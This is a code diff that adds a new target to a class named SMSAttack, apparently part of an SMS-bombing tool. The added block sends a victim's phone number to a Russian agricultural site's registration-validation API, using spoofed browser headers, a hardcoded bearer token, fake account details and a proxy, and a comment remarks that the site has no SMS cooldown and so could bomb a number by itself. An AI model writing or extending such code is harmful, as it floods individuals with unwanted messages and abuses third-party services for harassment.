@@ -1750,6 +1750,48 @@ class SMSAttack:
                 except:
                     self.r2 = str(int(self.r2) + 1)
                     self.stat()
+                try:
+                    # Smartseeds.ru, has no sms calldown, in theory may sms bomb only with this service ;)
+                    header = {
+                        'accept': 'application/json, text/plain, */*',
+                        'accept-encoding': 'gzip, deflate, br',
+                        'accept-language': 'fr-FR,fr',
+                        'content-length': '29',
+                        'content-type': 'application/json',
+                        'Origin': 'https://smartseeds.ru',
+                        'Referer': 'https://smartseeds.ru/account/registration',
+                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
+                        'sec-ch-ua-mobile': '?0',
+                        'sec-ch-ua-platform': '"Windows"',
+                        'sec-fetch-dest': 'empty',
+                        'sec-fetch-mode': 'cors',
+                        'sec-fetch-site': 'cross-site',
+                        'user-agent': user,
+                        'Authorization': 'Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw'
+                    }
+
+                    payload = {
+                          "profileDetails": {
+                            "individualTaxpayerNumber": "6163027810",
+                            "farmer": False,
+                            "vatPayer": False,
+                            "exportBasis": False
+                          },
+                          "contactFullName": "Бла бла бла",
+                          "email": "testmail@fi.ru",
+                          "password": "testpassword1234",
+                          "verificationCode": None,
+                          "phoneNumber": phone
+                    }
+
+                    await session.post('https://smartseeds.ru/api/native/v1.0/cargo-owner/validate', json=payload,
+                                       headers=header, proxy=proxy_2, timeout=1)
+                    self.r = str(int(self.r) + 1)
+                    self.stat()
+                except:
+                    self.r2 = str(int(self.r2) + 1)
+                    self.stat()
+
 
     def run_thread(self, time_a, phones, use_proxy, proxy=""):
         t = time.monotonic()
